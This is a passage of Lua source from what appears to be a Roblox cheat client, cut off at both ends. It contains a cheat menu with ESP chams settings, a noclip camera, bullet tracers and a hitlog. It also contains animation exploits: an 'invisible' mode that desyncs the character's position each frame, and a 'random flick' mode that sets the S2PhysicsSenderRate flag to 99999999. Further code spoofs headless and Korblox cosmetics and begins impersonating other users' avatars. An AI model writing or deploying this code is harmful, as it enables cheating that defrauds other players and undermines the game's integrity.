						Default = lib2.Config.ChamsOutlineAlpha,
						Step = 0.01,
						Nested = true,
						Parent = outline,
						Callback = function(chamsOutlineAlpha)
							lib2.Config.ChamsOutlineAlpha = chamsOutlineAlpha
						end,
					})

					tbl3.ESP:CreateSlider({
						Id = "ESP.Config.ChamsOutlineSize",
						Name = "Outline Size",
						Min = 0.01,
						Max = 1,
						Default = lib2.Config.ChamsOutlineSize,
						Step = 0.01,
						Nested = true,
						Parent = outline,
						Callback = function(chamsOutlineSize)
							lib2.Config.ChamsOutlineSize = chamsOutlineSize
						end,
					})

					local inline = tbl3.ESP:CreateToggle({
						Id = "ESP.Config.ChamsInline",
						Name = "Inline",
						Default = lib2.Config.ChamsInline,
						Callback = function(chamsInline)
							lib2.Config.ChamsInline = chamsInline
						end,
					})

					tbl3.ESP:CreateColorPicker({
						Id = "ESP.Config.ChamsInlineColor",
						Name = "Inline Color",
						Default = lib2.Config.ChamsInlineColor,
						Nested = true,
						Parent = inline,
						Callback = function(chamsInlineColor)
							lib2.Config.ChamsInlineColor = chamsInlineColor
						end,
					})

					tbl3.ESP:CreateSlider({
						Id = "ESP.Config.ChamsInlineAlpha",
						Name = "Inline Alpha",
						Min = 0,
						Max = 1,
						Default = lib2.Config.ChamsInlineAlpha,
						Step = 0.01,
						Nested = true,
						Parent = inline,
						Callback = function(chamsInlineAlpha)
							lib2.Config.ChamsInlineAlpha = chamsInlineAlpha
						end,
					})

					tbl3.ESP:CreateSlider({
						Id = "ESP.Config.ChamsInlineSize",
						Name = "Inline Size",
						Min = 0.01,
						Max = 0.5,
						Default = lib2.Config.ChamsInlineSize,
						Step = 0.01,
						Nested = true,
						Parent = inline,
						Callback = function(chamsInlineSize)
							lib2.Config.ChamsInlineSize = chamsInlineSize
						end,
					})

					tbl3.Camera.Module = render:CreateModule({
						Id = "render-camera",
						Name = "Camera",
						Callback = function(arg)
							if arg then
								RunService:BindToRenderStep(
									"MoonLuaV3SmoothCamera",
									Enum.RenderPriority.Camera.Value + 1,
									fn26
								)

								fn22(true)
								fn25(tbl3.Camera.Noclip)
							else
								RunService:UnbindFromRenderStep("MoonLuaV3SmoothCamera")
								fn22(false)
								fn25(false)
								tbl3.Camera.SmoothPosition = nil
							end
						end,
					})

					tbl3.Camera.Module:CreateToggle({
						Id = "render-camera-noclip",
						Name = "Noclip",
						Default = tbl3.Camera.Noclip,
						Callback = function(noclip)
							tbl3.Camera.Noclip = noclip
							fn25(tbl3.Camera.Module:Get() and noclip)
						end,
					})

					tbl3.Camera.Module:CreateSlider({
						Id = "render-camera-fov",
						Name = "FOV",
						Min = 1,
						Max = 120,
						Default = tbl3.Camera.Fov,
						Step = 1,
						Callback = function(fov)
							tbl3.Camera.Fov = fov

							if tbl3.Camera.Module:Get() and Camera() then
								Camera().FieldOfView = fov
							end
						end,
					})

					tbl3.Camera.Module:CreateSlider({
						Id = "render-camera-smooth-value",
						Name = "Speed",
						Min = 1,
						Max = 20,
						Default = tbl3.Camera.Smooth.Speed,
						Step = 1,
						Nested = true,
						Parent = tbl3.Camera.Module:CreateToggle({
							Id = "render-camera-smooth",
							Name = "Smooth",
							Default = tbl3.Camera.Smooth.Enabled,
							Callback = function(enabled)
								tbl3.Camera.Smooth.Enabled = enabled

								if not enabled then
									tbl3.Camera.SmoothPosition = nil
								end
							end,
						}),
						Callback = function(speed)
							tbl3.Camera.Smooth.Speed = speed
						end,
					})

					local function fn27()
						local instance = tbl3.World.Instance
						if instance and instance.Parent then
							return instance
						end
						local ColorCorrectionEffect = FindFirstChild(Lighting, "MoonLuaWorldColorCorrection")

						if not ColorCorrectionEffect or not IsA(ColorCorrectionEffect, "ColorCorrectionEffect") then
							ColorCorrectionEffect = NewInstance("ColorCorrectionEffect")
							ColorCorrectionEffect.Name = "MoonLuaWorldColorCorrection"
							ColorCorrectionEffect.Parent = Lighting
						end

						tbl3.World.Instance = ColorCorrectionEffect
						return ColorCorrectionEffect
					end

					local function fn28()
						local v10 = fn27()
						local v11 = tbl3.World.Module:Get()
						v10.Enabled = v11

						if v11 then
							v10.TintColor = tbl3.World.Color
							v10.Brightness = tbl3.World.Brightness
							v10.Contrast = tbl3.World.Contrast
							v10.Saturation = tbl3.World.Saturation
						else
							v10.TintColor = NewColor3(1, 1, 1)
							v10.Brightness = 0
							v10.Contrast = 0
							v10.Saturation = 0
						end
					end

					tbl3.World.Module = render:CreateModule({
						Id = "render-world",
						Name = "World",
						Callback = function()
							fn28()
						end,
					})

					local function fn29(arg, arg2, arg3)
						tbl3.World.Module:CreateSlider({
							Id = "RenderState.World." .. arg,
							Name = arg2,
							NameKey = arg3,
							Min = 0,
							Max = 1,
							Default = tbl3.World[arg],
							Step = 0.01,
							Callback = function(arg4)
								tbl3.World[arg] = arg4
								fn28()
							end,
						})
					end

					tbl3.World.Module:CreateColorPicker({
						Id = "RenderState.World.Color",
						Name = "Color",
						Default = tbl3.World.Color,
						Opened = true,
						Callback = function(color)
							tbl3.World.Color = color
							fn28()
						end,
					})

					fn29("Brightness", "Brightness", "render_world_brightness")
					fn29("Contrast", "Contrast", "render_world_contrast")
					fn29("Saturation", "Saturation", "render_world_saturation")
					fn28()

					for k, v10 in next, tbl3.BulletTracer.Tracerlist, nil do
						tbl3.BulletTracer.Tracers[k] = {
							Texture = v10.Texture,
							Width0 = v10.Width0,
							Create = function(position, position2, arg, arg2, width0)
								local Attachment = NewInstance("Attachment", workspace.Terrain)
								local Attachment2 = NewInstance("Attachment", workspace.Terrain)
								Attachment.Position = position
								Attachment2.Position = position2
								local Beam = NewInstance("Beam", workspace.Terrain)

								for k2, v11 in pairs(v10) do
									Beam[k2] = v11
								end

								Beam.Attachment0 = Attachment
								Beam.Attachment1 = Attachment2
								Beam.Color = ColorSequence.new(arg)
								Beam.Width0 = width0
								Beam.Width1 = width0
								Debris:AddItem(Attachment, arg2)
								Debris:AddItem(Attachment2, arg2)
								Debris:AddItem(Beam, arg2)

								Delay(arg2 * 0.5, function()
									TweenService
										:Create(
											Beam,
											TweenInfo.new(arg2 * 0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
											{ Width0 = Beam.Width0 * 0.9, Width1 = Beam.Width1 * 0.9 }
										)
										:Play()

									local NumberValue = NewInstance("NumberValue")
									NumberValue.Value = 0.45

									Connect(GetPropertyChangedSignal(NumberValue, "Value"), function()
										Beam.Transparency = NumberSequence.new(NumberValue.Value)
									end)

									local v11
									TweenService:Create(NumberValue, v11, { Value = 1 }):Play()
								end)
							end,
						}
					end

					CreateTracer = function(arg, arg2, arg3, arg4)
						if not tbl3.BulletTracer.Module:Get() then
							return
						end
						local v10 = tbl3.BulletTracer.Tracers[tbl3.BulletTracer.Tracer]

						if v10 and v10.Create then
							v10.Create(
								arg,
								arg2,
								arg4 and tbl3.BulletTracer.EnemyColor or tbl3.BulletTracer.SelfColor,
								arg3 or tbl3.BulletTracer.Time,
								v10.Width0
							)
						end
					end

					tbl3.BulletTracer.Module =
						render:CreateModule({ Id = "render-bullet-tracer", Name = "Bullet Tracer", Default = true })

					tbl3.BulletTracer.Module:CreateSelector({
						Id = "RenderState.BulletTracer.Tracer",
						Name = "Mode",
						Options = { { Value = "Obelus" }, { Value = "Lightning" }, { Value = "DNA" } },
						Default = tbl3.BulletTracer.Tracer,
						Callback = function(tracer)
							tbl3.BulletTracer.Tracer = tracer
						end,
					})

					tbl3.BulletTracer.Module:CreateColorPicker({
						Id = "RenderState.BulletTracer.SelfColor",
						Name = "Self Color",
						Default = tbl3.BulletTracer.SelfColor,
						Opened = true,
						Callback = function(selfColor)
							tbl3.BulletTracer.SelfColor = selfColor
						end,
					})

					tbl3.BulletTracer.Module:CreateColorPicker({
						Id = "RenderState.BulletTracer.EnemyColor",
						Name = "Enemy Color",
						Default = tbl3.BulletTracer.EnemyColor,
						Opened = true,
						Callback = function(enemyColor)
							tbl3.BulletTracer.EnemyColor = enemyColor
						end,
					})

					tbl3.BulletTracer.Module:CreateSlider({
						Id = "RenderState.BulletTracer.Time",
						Name = "Time",
						Min = 1,
						Max = 10,
						Default = tbl3.BulletTracer.Time,
						Step = 1,
						Callback = function(time)
							tbl3.BulletTracer.Time = time
						end,
					})

					render:CreateModule({
						Id = "render-hitlog",
						Name = "Hitlog",
						Default = hitlogEnabled,
						Callback = function(arg)
							hitlogEnabled = arg
						end,
					})

					local misc = window:CreateTab({ Id = "tab-misc", Name = "Misc" })
					local tbl4 = { Animation = { Module = nil, Mode = "R6 Hide Head" } }

					local tbl5 = {
						Connection = nil,
						RenderBound = false,
						HideHeadTrack = nil,
						HideHeadLastHumanoid = nil,
						HideHeadAnim = nil,
						InvisibleTrack = nil,
						InvisibleSavedCFrame = nil,
						InvisibleAnim = nil,
						SpamTrack1 = nil,
						SpamTrack2 = nil,
						SpamAnim1 = nil,
						SpamAnim2 = nil,
						SpamAngle = 0,
						SpamLastHumanoid = nil,
						SpamLastFFlagTime = 0,
						SpamSpinSpeed = 100,
						SpamTimePosRatio = 0.5,
						R15Track = nil,
						R15LastHumanoid = nil,
						R15Anim = nil,
					}

					local function fn30()
						local character = LocalPlayer.Character
						return character and FindFirstChildOfClass(character, "Humanoid")
					end

					local function fn31(parent)
						if not parent then
							return nil
						end
						local Animator = FindFirstChildOfClass(parent, "Animator")

						if not Animator then
							Animator = NewInstance("Animator")
							Animator.Parent = parent
						end

						return Animator
					end

					local function fn32(arg)
						if arg then
							pcall(function()
								arg:Stop(0)
							end)
						end
					end

					local function fn33()
						local character = LocalPlayer.Character
						if not character then
							return
						end
						local children = GetChildren(character)

						for i = 1, #children do
							local v10 = children[i]

							if IsA(v10, "BasePart") and v10.Transparency == 0.5 then
								v10.Transparency = 0
							end
						end
					end

					local function fn34()
						if tbl5.Connection then
							Disconnect(tbl5.Connection)
							tbl5.Connection = nil
						end

						RunService:UnbindFromRenderStep("MoonLuaV3AnimationRenderFix")
						RunService:UnbindFromRenderStep("MoonLuaV3LuanFeiAnimFix")
						RunService:UnbindFromRenderStep("MoonLuaV3AnimationRestoreCFrame")

						if tbl5.RenderBound then
							tbl5.RenderBound = false
						end

						fn32(tbl5.HideHeadTrack)
						fn32(tbl5.InvisibleTrack)
						fn32(tbl5.SpamTrack1)
						fn32(tbl5.SpamTrack2)
						fn32(tbl5.R15Track)
						tbl5.HideHeadTrack = nil
						tbl5.HideHeadLastHumanoid = nil
						tbl5.InvisibleTrack = nil
						tbl5.InvisibleSavedCFrame = nil
						tbl5.SpamTrack1 = nil
						tbl5.SpamTrack2 = nil
						tbl5.SpamAngle = 0
						tbl5.SpamLastHumanoid = nil
						tbl5.SpamLastFFlagTime = 0
						tbl5.R15Track = nil
						tbl5.R15LastHumanoid = nil
						fn33()
					end

					local function fn35(arg, arg2, priority, arg3, arg4)
						local v10 = fn30()
						if not v10 or v10.Health <= 0 then
							return arg2
						end
						local flag = false

						if arg2 then
							local result4

							flag, result4 = pcall(function()
								return arg2.IsPlaying
							end)

							flag = flag and result4 == true
						end

						if not flag then
							local v11 = fn31(v10)
							if not v11 then
								return arg2
							end
							fn32(arg2)

							local ok4, result4 = pcall(function()
								return v11:LoadAnimation(arg)
							end)

							if ok4 and result4 then
								arg2 = result4
								arg2.Priority = priority or Enum.AnimationPriority.Action
								arg2.Looped = true
								arg2:Play(0, 1, arg3 or 1)
							end
						end

						if arg2 then
							pcall(function()
								if arg3 then
									arg2:AdjustSpeed(arg3)
								end

								if arg4 then
									arg2.TimePosition = arg4(arg2)
								end
							end)
						end

						return arg2
					end

					local function fn36()
						tbl5.HideHeadAnim = tbl5.HideHeadAnim or NewInstance("Animation")
						tbl5.HideHeadAnim.AnimationId = "rbxassetid://68339848"

						tbl5.Connection = Connect(RunService.Heartbeat, function()
							local v10 = fn30()

							if tbl5.HideHeadLastHumanoid ~= v10 then
								fn32(tbl5.HideHeadTrack)
								tbl5.HideHeadTrack = nil
								tbl5.HideHeadLastHumanoid = v10
							end

							tbl5.HideHeadTrack = fn35(
								tbl5.HideHeadAnim,
								tbl5.HideHeadTrack,
								Enum.AnimationPriority.Action,
								0,
								function(arg)
									return arg.Length > 0 and arg.Length or 0
								end
							)
						end)
					end

					local function fn37()
						tbl5.R15Anim = tbl5.R15Anim or NewInstance("Animation")
						tbl5.R15Anim.AnimationId = "rbxassetid://102325931762962"

						tbl5.Connection = Connect(RunService.Heartbeat, function()
							local v10 = fn30()

							if tbl5.R15LastHumanoid ~= v10 then
								fn32(tbl5.R15Track)
								tbl5.R15Track = nil
								tbl5.R15LastHumanoid = v10
							end

							tbl5.R15Track = fn35(tbl5.R15Anim, tbl5.R15Track, Enum.AnimationPriority.Action, 1)

							if tbl5.R15Track then
								pcall(function()
									tbl5.R15Track:AdjustWeight(1, 0)
								end)
							end
						end)
					end

					local function fn38()
						tbl5.InvisibleAnim = tbl5.InvisibleAnim or NewInstance("Animation")
						tbl5.InvisibleAnim.AnimationId = "rbxassetid://282574440"

						tbl5.Connection = Connect(RunService.Heartbeat, function()
							local character = LocalPlayer.Character
							local humanoid = character and FindFirstChildOfClass(character, "Humanoid")
							local humanoidRootPart = character and FindFirstChild(character, "HumanoidRootPart")
							if not humanoid or not humanoidRootPart or humanoid.Health <= 0 then
								return
							end

							tbl5.InvisibleTrack = fn35(
								tbl5.InvisibleAnim,
								tbl5.InvisibleTrack,
								Enum.AnimationPriority.Action,
								0,
								function()
									return 0.3
								end
							)

							tbl5.InvisibleSavedCFrame = humanoidRootPart.CFrame
							humanoidRootPart.CFrame = tbl5.InvisibleSavedCFrame + NewVector3(0, -2, 0)
						end)

						RunService:BindToRenderStep("MoonLuaV3AnimationRenderFix", 199, function()
							local character = LocalPlayer.Character
							local humanoidRootPart = character and FindFirstChild(character, "HumanoidRootPart")

							if humanoidRootPart and tbl5.InvisibleSavedCFrame then
								humanoidRootPart.CFrame = tbl5.InvisibleSavedCFrame
								tbl5.InvisibleSavedCFrame = nil
							end

							fn32(tbl5.InvisibleTrack)
							tbl5.InvisibleTrack = nil

							if character then
								local children = GetChildren(character)

								for i = 1, #children do
									local v10 = children[i]

									if
										IsA(v10, "BasePart")
										and (
											v10.Name == "Head"
											or v10.Name == "Torso"
											or v10.Name:match("Arm")
											or v10.Name:match("Leg")
										)
									then
										v10.Transparency = 0.5
									end
								end
							end
						end)

						tbl5.RenderBound = true
					end

					local function fn39()
						tbl5.SpamAnim1 = tbl5.SpamAnim1 or NewInstance("Animation")
						tbl5.SpamAnim1.AnimationId = "rbxassetid://215384594"
						tbl5.SpamAnim2 = tbl5.SpamAnim2 or NewInstance("Animation")
						tbl5.SpamAnim2.AnimationId = "rbxassetid://68339848"

						RunService:BindToRenderStep("MoonLuaV3LuanFeiAnimFix", 199, function()
							if tbl4.Animation ~= "R6 Random Flick" then
								return
							end

							if tbl5.SpamTrack1 then
								pcall(function()
									tbl5.SpamTrack1:Stop(0)
								end)
							end

							if tbl5.SpamTrack2 then
								pcall(function()
									tbl5.SpamTrack2:Stop(0)
								end)
							end
						end)

						tbl5.RenderBound = true

						tbl5.Connection = Connect(RunService.Heartbeat, function()
							local now = tick()

							if now - tbl5.SpamLastFFlagTime >= 1 then
								tbl5.SpamLastFFlagTime = now

								pcall(function()
									setfflag("S2PhysicsSenderRate", "99999999")
								end)
							end

							local v10 = fn30()
							if not v10 or v10.Health <= 0 then
								return
							end

							if tbl5.SpamLastHumanoid ~= v10 then
								fn32(tbl5.SpamTrack1)
								fn32(tbl5.SpamTrack2)
								tbl5.SpamTrack1 = nil
								tbl5.SpamTrack2 = nil
								tbl5.SpamLastHumanoid = v10
							end

							local animator = FindFirstChildOfClass(v10, "Animator") or v10

							if not tbl5.SpamTrack1 then
								pcall(function()
									tbl5.SpamTrack1 = animator:LoadAnimation(tbl5.SpamAnim1)
									tbl5.SpamTrack1.Priority = Enum.AnimationPriority.Action4
								end)
							end

							if not tbl5.SpamTrack2 then
								pcall(function()
									tbl5.SpamTrack2 = animator:LoadAnimation(tbl5.SpamAnim2)
									tbl5.SpamTrack2.Priority = Enum.AnimationPriority.Action4
									tbl5.SpamTrack2.Looped = true
								end)
							end

							if tbl5.SpamTrack1 then
								pcall(function()
									if not tbl5.SpamTrack1.IsPlaying then
										tbl5.SpamTrack1:Play()
									end

									tbl5.SpamTrack1:AdjustSpeed(0)

									tbl5.SpamTrack1.TimePosition = tbl5.SpamTrack1.Length > 0
											and tbl5.SpamTimePosRatio * tbl5.SpamTrack1.Length
										or tbl5.SpamTimePosRatio
								end)
							end

							if tbl5.SpamTrack2 then
								pcall(function()
									if not tbl5.SpamTrack2.IsPlaying then
										tbl5.SpamTrack2:Play()
									end

									tbl5.SpamTrack2:AdjustSpeed(1)
								end)
							end

							tbl5.SpamAngle = tbl5.SpamAngle + tbl5.SpamSpinSpeed
							local character = LocalPlayer.Character
							local humanoidRootPart = character and FindFirstChild(character, "HumanoidRootPart")
							if not humanoidRootPart then
								return
							end
							local cFrame = humanoidRootPart.CFrame
							local rad = Rad
							local n4 = tbl5.SpamAngle * 0.8

							humanoidRootPart.CFrame = cFrame
								* Angles(Rad(tbl5.SpamAngle), Rad(tbl5.SpamAngle * 1.5), rad(n4))

							RunService:UnbindFromRenderStep("MoonLuaV3AnimationRestoreCFrame")

							RunService:BindToRenderStep("MoonLuaV3AnimationRestoreCFrame", 199, function()
								if character and humanoidRootPart and humanoidRootPart.Parent then
									humanoidRootPart.CFrame = cFrame
								end

								RunService:UnbindFromRenderStep("MoonLuaV3AnimationRestoreCFrame")
							end)
						end)
					end

					local function fn40(arg)
						fn34()

						if arg == "R6 Hide Head" then
							fn36()
						elseif arg == "R6 Invisible" then
							fn38()
						elseif arg == "R6 Random Flick" then
							fn39()
						elseif arg == "R15 Hide Head/Leg" then
							fn37()
						end
					end

					tbl4.Animation.Module = misc:CreateModule({
						Id = "misc-animation",
						Name = "Animation",
						Callback = function(arg)
							fn34()

							if arg then
								fn40(tbl4.Animation.Mode)
							end
						end,
					})

					tbl4.Animation.Module:CreateKeybind({
						Id = "misc-animation-keybind",
						Name = "Keybind",
						Callback = function()
							tbl4.Animation.Module:Set(not tbl4.Animation.Module:Get())
						end,
					})

					tbl4.Animation.Module:CreateSelector({
						Id = "MiscState.Animation.Mode",
						Name = "Mode",
						Options = {
							{ Value = "R6 Hide Head" },
							{ Value = "R6 Invisible" },
							{ Value = "R6 Random Flick" },
							{ Value = "R15 Hide Head/Leg" },
						},
						Default = tbl4.Animation.Mode,
						Callback = function(mode)
							tbl4.Animation.Mode = mode
							fn34()

							if tbl4.Animation.Module:Get() then
								fn40(mode)
							end
						end,
					})

					local meshId = "rbxassetid://1095708"
					local meshId2 = "rbxassetid://101851696"
					local textureId = "rbxassetid://101851254"
					local color2 = NewRGB(64, 64, 64)
					local name = "KorbloxLeg"
					local tbl6 = { CharacterAdded = nil, Snapshot = nil }

					local function fn41()
						if tbl6.CharacterAdded then
							Disconnect(tbl6.CharacterAdded)
							tbl6.CharacterAdded = nil
						end
					end

					local function fn42(arg, arg2)
						local tbl7 = {}
						if not arg then
							return tbl7
						end
						local children = GetChildren(arg)

						for i = 1, #children do
							local v10 = children[i]

							if IsA(v10, arg2) then
								Insert(tbl7, v10:Clone())
							end
						end

						return tbl7
					end

					local function fn43(arg)
						if not arg or tbl6.Snapshot and tbl6.Snapshot.Character == arg then
							return
						end
						local head = FindFirstChild(arg, "Head")
						local v10 = FindFirstChild(arg, "Right Leg")
						local rightUpperLeg = FindFirstChild(arg, "RightUpperLeg")
						local face = head and (FindFirstChild(head, "face") or FindFirstChildWhichIsA(head, "Decal"))

						tbl6.Snapshot = {
							Character = arg,
							HeadTransparency = head and head.Transparency or 0,
							HeadCanCollide = head and head.CanCollide or false,
							HeadMeshes = fn42(head, "SpecialMesh"),
							FaceTexture = face and face.Texture or nil,
							RightLegColor = v10 and v10.Color or nil,
							RightLegMeshes = fn42(v10, "SpecialMesh"),
							RightLegCharacterMeshes = fn42(v10, "CharacterMesh"),
							RightUpperLegTransparency = rightUpperLeg and rightUpperLeg.Transparency or 0,
							RightLowerLegTransparency = FindFirstChild(arg, "RightLowerLeg")
									and arg.RightLowerLeg.Transparency
								or 0,
							RightFootTransparency = FindFirstChild(arg, "RightFoot") and arg.RightFoot.Transparency
								or 0,
						}
					end

					local function fn44(arg)
						if not arg then
							return
						end
						local face = FindFirstChild(arg, "face") or FindFirstChildWhichIsA(arg, "Decal")

						if face then
							face:Destroy()
						end
					end

					local function fn45(parent)
						if not parent then
							return
						end
						parent.Transparency = 1
						parent.CanCollide = false
						fn44(parent)
						local children = GetChildren(parent)

						for i = 1, #children do
							local v10 = children[i]

							if IsA(v10, "SpecialMesh") then
								v10:Destroy()
							end
						end

						local SpecialMesh = NewInstance("SpecialMesh")
						SpecialMesh.MeshType = Enum.MeshType.FileMesh
						SpecialMesh.MeshId = meshId
						SpecialMesh.Scale = NewVector3(0.001, 0.001, 0.001)
						SpecialMesh.Parent = parent
					end

					local function fn46(arg)
						local v10 = FindFirstChild(arg, "Right Leg")
						if not v10 then
							return
						end
						local children = GetChildren(v10)

						for i = 1, #children do
							local v11 = children[i]

							if IsA(v11, "SpecialMesh") or IsA(v11, "CharacterMesh") then
								v11:Destroy()
							end
						end

						v10.Color = color2
						local SpecialMesh = NewInstance("SpecialMesh")
						SpecialMesh.MeshType = Enum.MeshType.FileMesh
						SpecialMesh.MeshId = meshId2
						SpecialMesh.TextureId = textureId
						SpecialMesh.Scale = NewVector3(1, 1, 1)
						SpecialMesh.Parent = v10
					end

					local function fn47(parent)
						local rightUpperLeg = FindFirstChild(parent, "RightUpperLeg")
						if not rightUpperLeg then
							return
						end
						local korbloxLeg = FindFirstChild(parent, "KorbloxLeg")

						if korbloxLeg then
							korbloxLeg:Destroy()
						end

						rightUpperLeg.Transparency = 1
						local rightLowerLeg = FindFirstChild(parent, "RightLowerLeg")
						local rightFoot = FindFirstChild(parent, "RightFoot")

						if rightLowerLeg then
							rightLowerLeg.Transparency = 1
						end

						if rightFoot then
							rightFoot.Transparency = 1
						end

						local Part = NewInstance("Part")
						Part.Name = name
						Part.Size = NewVector3(1, 2, 1)
						Part.Anchored = false
						Part.CanCollide = false
						Part.Color = color2
						Part.Parent = parent
						local SpecialMesh = NewInstance("SpecialMesh")
						SpecialMesh.MeshType = Enum.MeshType.FileMesh
						SpecialMesh.MeshId = meshId2
						SpecialMesh.TextureId = textureId
						SpecialMesh.Scale = NewVector3(1, 1, 1)
						SpecialMesh.Parent = Part
						local Weld = NewInstance("Weld")
						Weld.Part0 = rightUpperLeg
						Weld.Part1 = Part
						Weld.C0 = NewCFrame(0, -0.8, 0)
						Weld.Parent = Part
					end

					local function fn48(arg)
						if not arg then
							return
						end
						fn43(arg)
						Wait(0.1)
						if not arg.Parent then
							return
						end
						fn45(FindFirstChild(arg, "Head"))
						local humanoid = FindFirstChildOfClass(arg, "Humanoid")
						if not humanoid then
							return
						end

						if humanoid.RigType == Enum.HumanoidRigType.R6 then
							fn46(arg)
						elseif humanoid.RigType == Enum.HumanoidRigType.R15 then
							fn47(arg)
						end
					end

					local function fn49(parent, arg)
						if not parent then
							return
						end
						arg = arg or {}

						for i = 1, #arg do
							arg[i].Parent = parent
						end
					end

					local function fn50(arg, arg2)
						local head = FindFirstChild(arg, "Head")
						if not head then
							return
						end
						head.Transparency = arg2.HeadTransparency
						head.CanCollide = arg2.HeadCanCollide
						local children = GetChildren(head)

						for i = 1, #children do
							local v10 = children[i]

							if IsA(v10, "SpecialMesh") then
								v10:Destroy()
							end
						end

						fn49(head, arg2.HeadMeshes)
						local faceTexture = arg2.FaceTexture

						if faceTexture then
							faceTexture = not (FindFirstChild(head, "face") or FindFirstChildWhichIsA(head, "Decal"))
						end

						if faceTexture then
							local Decal = NewInstance("Decal")
							Decal.Name = "face"
							Decal.Texture = arg2.FaceTexture
							Decal.Parent = head
						end
					end

					local function fn51(arg, arg2)
						local v10 = FindFirstChild(arg, "Right Leg")

						if v10 then
							if arg2.RightLegColor then
								v10.Color = arg2.RightLegColor
							end

							local children = GetChildren(v10)

							for i = 1, #children do
								local v11 = children[i]

								if IsA(v11, "SpecialMesh") or IsA(v11, "CharacterMesh") then
									v11:Destroy()
								end
							end

							fn49(v10, arg2.RightLegMeshes)
							fn49(v10, arg2.RightLegCharacterMeshes)
						end

						local rightUpperLeg = FindFirstChild(arg, "RightUpperLeg")

						if rightUpperLeg then
							rightUpperLeg.Transparency = arg2.RightUpperLegTransparency
						end

						local rightLowerLeg = FindFirstChild(arg, "RightLowerLeg")

						if rightLowerLeg then
							rightLowerLeg.Transparency = arg2.RightLowerLegTransparency
						end

						local rightFoot = FindFirstChild(arg, "RightFoot")

						if rightFoot then
							rightFoot.Transparency = arg2.RightFootTransparency
						end

						local korbloxLeg = FindFirstChild(arg, "KorbloxLeg")

						if korbloxLeg then
							korbloxLeg:Destroy()
						end
					end

					local function fn52(arg)
						local snapshot = tbl6.Snapshot

						if not arg or not snapshot or snapshot.Character ~= arg then
							local korbloxLeg = arg and FindFirstChild(arg, "KorbloxLeg")

							if korbloxLeg then
								korbloxLeg:Destroy()
							end

							tbl6.Snapshot = nil
							return
						end

						fn50(arg, snapshot)
						fn51(arg, snapshot)
						tbl6.Snapshot = nil
					end

					local function fn53()
						fn41()

						tbl6.CharacterAdded = Connect(LocalPlayer.CharacterAdded, function(arg)
							tbl6.Snapshot = nil
							fn48(arg)
						end)

						if LocalPlayer.Character then
							Spawn(fn48, LocalPlayer.Character)
						end
					end

					local function fn54()
						fn41()

						if LocalPlayer.Character then
							fn52(LocalPlayer.Character)
						else
							tbl6.Snapshot = nil
						end
					end

					misc:CreateModule({
						Id = "misc-headless-korblox",
						Name = "Headless and Korblox",
						Callback = function(arg)
							if arg then
								fn53()
							else
								fn54()
							end
						end,
					})

					local texture = "rbxasset://textures/face.png"
					local str2 = "None"
					local tbl7 = { Input = "", Busy = false, Original = nil, Target = nil, CharacterAdded = nil }

					local function fn55()
						if tbl7.Original then
							return tbl7.Original
						end
						local name2 = str2

						pcall(function()
							name2 = LocalPlayer.MembershipType.Name
						end)

						local flag = false

						pcall(function()
							flag = LocalPlayer.HasVerifiedBadge == true
						end)

						tbl7.Original = {
							UserId = LocalPlayer.UserId,
							Username = LocalPlayer.Name,
							DisplayName = LocalPlayer.DisplayName,
							Membership = name2,
							HasVerifiedBadge = flag,
						}

						return tbl7.Original
					end

					local function fn56(arg)
						if typeof(arg) == "number" then
							if arg > 0 then
								return arg
							end
							return nil
						end

						local flag = typeof(arg) == "string" and arg
						local str3

						if flag then
							str3 = flag
						else
							str3 = tostring(arg or "")
						end

						local v10 = string.gsub(string.gsub(string.gsub(str3, "^%s+", ""), "%s+$", ""), "^@", "")
						if v10 == "" then
							return nil
						end
						local num = tonumber(v10)
						if num and num > 0 then
							return num
						end

						local ok4, result4 = pcall(function()
							return Players:GetUserIdFromNameAsync(v10)
						end)

						if ok4 and typeof(result4) == "number" and result4 > 0 then
							return result4
						end
						return nil
					end

					local function fn57(arg)
						local original = tbl7.Original
						if original and original.UserId == arg then
							return original.Username, original.DisplayName
						end
						local players = GetPlayerList()

						for i = 1, #players do
							local v10 = players[i]
							if v10 ~= LocalPlayer and v10.UserId == arg then
								return v10.Name, v10.DisplayName ~= "" and v10.DisplayName or v10.Name
							end
						end

						if UserService then
							local ok4, result4 = pcall(function()
								return UserService:GetUserInfosByUserIdsAsync({ arg })
							end)

							ok4 = ok4 and type(result4) == "table" and result4[1]
							if type(ok4) == "table" and ok4.Username then
								return ok4.Username, ok4.DisplayName ~= "" and ok4.DisplayName or ok4.Username
							end
						end

						local ok4, result4 = pcall(function()
							return Players:GetNameFromUserIdAsync(arg)
						end)

						if ok4 and typeof(result4) == "string" and result4 ~= "" then
							return result4, result4
						end
						return nil, nil
					end

					local function fn58(arg)
						if not arg then
							return
						end
						local descendants = GetDescendants(arg)

						for i = 1, #descendants do
							local v10 = descendants[i]

							if
								IsA(v10, "Accessory")
								or IsA(v10, "Shirt")
								or IsA(v10, "Pants")
								or IsA(v10, "CharacterMesh")
								or IsA(v10, "BodyColors")
								or IsA(v10, "ShirtGraphic")
							then
								v10:Destroy()
							end
						end

						local head = FindFirstChild(arg, "Head")
						if not head then
							return
						end
						local children = GetChildren(head)

						for i = 1, #children do
							local v10 = children[i]

							if IsA(v10, "SpecialMesh") and GetAttribute(v10, "FromMorph") == true then
								v10:Destroy()
							end
						end

						local face = FindFirstChild(head, "face")

						if face then
							face:Destroy()
						end
					end

					local function fn59(parent, arg)
						if not parent or not arg then
							return
						end
						local humanoid = FindFirstChildOfClass(parent, "Humanoid")
						local head = FindFirstChild(parent, "Head")
						local children = GetChildren(arg)

						for i = 1, #children do
							local v10 = children[i]

							if
								IsA(v10, "Shirt")
								or IsA(v10, "Pants")
								or IsA(v10, "BodyColors")
								or IsA(v10, "ShirtGraphic")
								or IsA(v10, "Accessory")
							then
								v10.Parent = parent
							elseif IsA(v10, "SpecialMesh") and head then
								SetAttribute(v10, "FromMorph", true)
								v10.Parent = head
							elseif v10.Name == "R6" and humanoid and humanoid.RigType == Enum.HumanoidRigType.R6 then
								local characterMesh = FindFirstChildOfClass(v10, "CharacterMesh")

								if characterMesh then
									characterMesh.Parent = parent
								end
							elseif v10.Name == "R15" and humanoid and humanoid.RigType == Enum.HumanoidRigType.R15 then
								local characterMesh = FindFirstChildOfClass(v10, "CharacterMesh")

								if characterMesh then
									characterMesh.Parent = parent
								end
							end
						end

						if not head then
							return
						end
						local face = FindFirstChild(arg, "face")
						if face then
							face.Parent = head
							return
						end
						local Decal = NewInstance("Decal")
						Decal.Name = "face"
						Decal.Face = Enum.NormalId.Front
						Decal.Texture = texture
						Decal.Parent = head
					end

					local function fn60(arg, displayName, arg2, arg3)
